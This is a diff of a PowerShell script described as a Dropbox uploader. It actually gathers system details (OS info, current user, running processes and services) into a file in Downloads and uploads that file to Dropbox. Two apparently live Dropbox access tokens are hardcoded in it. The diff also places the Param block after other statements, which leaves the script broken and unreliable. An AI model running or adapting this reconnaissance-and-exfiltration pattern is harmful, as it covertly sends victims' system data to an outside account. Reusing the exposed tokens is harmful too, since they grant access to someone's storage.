@@ -1,6 +1,31 @@
-# Example usage (replace with your actual file paths)
+<#
+.SYNOPSIS
+This is a PowerShell script to upload a file to Dropbox using their REST API.
+
+.DESCRIPTION
+This PowerShell script will upload   
+ a file to Dropbox using their REST API with the parameters you provide.
+
+.PARAMETER SourceFilePath
+The path of the file to upload.
+
+.PARAMETER TargetFilePath
+The path of the file on Dropbox.
+
+.ENV PARAMETER DropBoxAccessToken
+The Dropbox access token.   
+
+#>
+
 $sourceFilePath = "$env:USERPROFILE\Downloads\output_filename.txt"
 $targetFilePath = "/Scripts/output.txt" # Uploads to the "/Scripts" folder in your Dropbox
+
+Param(
+    [Parameter(Mandatory = $true)]
+    [string]$SourceFilePath,
+    [Parameter(Mandatory = $true)]
+    [string]$TargetFilePath 
+)
 
 # Gather System Information
 Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $sourceFilePath
@@ -16,13 +41,6 @@ $currentUser.Identity.Name >> $sourceFilePath
 Get-Process >> $sourceFilePath
 Get-Service >> $sourceFilePath
 
-Param(
-    [Parameter(Mandatory = $true)]
-    [string]$SourceFilePath,
-    [Parameter(Mandatory = $true)]
-    [string]$TargetFilePath   
-
-)
 
 # Construct the Dropbox-API-Arg JSON
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -48,5 +66,5 @@ catch {
 }
 
 # Dropbox Configuration 
-$env:DropBoxAccessToken = "sl.B7tscX1_hb2KUSOe5XaCxajd-CtxwSylQBEYFbiykfYJ-thV3tJpUw2iNG0zBes-x9oeuPUBMbikluXZQwj_uaGY437N_LUeQxgfgCr4BSLQJtgOZrE4pE3w0_Yms2lK2f-S_x6fiJLN"
+$env:DropBoxAccessToken = "sl.B7u1ZplIi39ac68T5sH_qg6EH0qBa_atBBXpK0408D0cU98Rw7N5TvT3hLUgJBqMFuabqKugjD58cj4bJagxg_LOHxG1xkj7NTE5O32EXxsCEV-EMiMGoGKRq9CwR9Zd2eXNzx3eptwbpC4"
 $dropboxFolderPath = "/Scripts"
